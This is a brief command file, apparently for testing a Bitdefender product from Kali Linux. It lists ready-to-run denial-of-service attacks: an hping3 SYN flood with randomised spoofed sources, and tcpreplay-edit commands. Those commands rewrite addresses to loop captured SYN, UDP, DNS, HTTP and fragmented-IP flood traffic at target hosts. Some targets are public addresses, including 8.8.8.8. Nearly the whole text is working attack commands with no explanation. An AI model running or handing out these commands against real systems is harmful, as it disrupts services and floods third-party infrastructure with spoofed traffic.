#using Kali for bitdefender 
hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 172.24.1.215

#DOS attack SYN:
tcpreplay-edit --srcipmap=10.0.0.2:172.24.1.215 --dstipmap=10.128.0.2:213.209.17.209 --enet-smac=54:8d:5a:d0:b6:96 --enet-dmac=e8:44:7e:5:c7:29  --loop=10 -i wlan0 SYN.pcap

#DOS attack UDP:
tcpreplay-edit --srcipmap=223.251.186.236:172.24.1.215 --dstipmap=235.127.67.235:213.209.17.209 --enet-smac=54:8d:5a:d0:b6:96 --enet-dmac=e8:44:7e:5:c7:29 --loop=10 -i wlan0 udp_flood.pcap

#DOS attack DNS:
tcpreplay-edit --srcipmap=207.86.6.174:172.24.1.215 --dstipmap=205.94.14.222:8.8.8.8 --enet-smac=54:8d:5a:d0:b6:96 --enet-dmac=e8:44:7e:5:c7:29  --loop=10 -i wlan0 dns.pcap

#DOS attack HTTP:
tcpreplay-edit --srcipmap=192.168.2.183:172.24.1.215 --dstipmap=192.168.10.124:213.209.17.209 --enet-smac=54:8d:5a:d0:b6:96 --enet-dmac=e8:44:7e:5:c7:29  --loop=10 -i wlan0 HTTPDoS.pcapng

#DOS attack IP fragmented:
tcpreplay-edit --srcipmap=10.0.0.2:172.24.1.211 --dstipmap=10.128.0.2:213.209.17.209 --enet-smac=20:df:b9:ab:90:42 --enet-dmac=e8:44:7e:5:c7:29  --loop=10 -i wlan0 ip_fragmented.pcap

